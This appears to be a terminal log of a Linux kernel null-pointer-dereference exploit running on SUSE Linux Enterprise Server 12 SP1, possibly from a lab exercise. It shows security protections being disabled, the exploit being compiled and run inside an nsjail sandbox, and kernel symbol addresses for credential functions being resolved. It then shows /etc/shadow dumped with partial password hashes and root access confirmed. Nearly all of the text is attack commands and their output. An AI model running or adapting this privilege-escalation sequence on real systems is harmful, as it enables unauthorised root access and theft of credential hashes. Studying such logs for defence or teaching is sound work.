```
$cat /etc/*-release
```
PRETTY_NAME="SUSE Linux Enterprise Server 12 SP1"
```
$id
```
uid=1000(jeremysp1) gid=100(users) groups=100(users)
```
$sudo sh disable_security.sh
$gcc exp.c -o exp 2>/dev/null
$../nsjail/nsjail -Mo --user 0 --group 0 --keep_caps --chroot / -- /bin/sh -i 
sh-4.2# /home/jeremysp1/null_pointer_derf/exp
```
[+] prepare_kernel_cred :ffffffff81081250
[+] commit_creds :ffffffff81080f80
[+] mmap is successfull.
[+] addr :        0
in trigger!!
at:!:16883::::::
bin:*:16765::::::
daemon:*:16765::::::
ftp:*:16765::::::
ftpsecure:!:16883::::::
games:*:16765::::::
gdm:!:16883::::::
lp:*:16765::::::
mail:*:16765::::::
man:*:16765::::::
messagebus:!:16765::::::
news:*:16765::::::
nobody:*:16765::::::
nscd:!:16765::::::
ntp:!:16883::::::
openslp:!:16765::::::
polkitd:!:16765::::::
postfix:!:16883::::::
pulse:!:16883::::::
root:$6$GfY2v.Bz1BPLFMpdu9RJeC2x95lYZnMP0:16883::::::
rpc:!:16765::::::
rtkit:!:16883::::::
scard:!:16883::::::
sshd:!:16765::::::
statd:!:16883::::::
usbmux:!:16883::::::
uucp:*:16765::::::
vnc:!:16883::::::
wwwrun:*:16765::::::
jeremysp1:$6$71vmiLA.:16883:0:99999:7:::
pesign:!:16885::::::
``` sh
sh-4.2# id
```
uid=0(root) gid=0(root) groups=0(root)

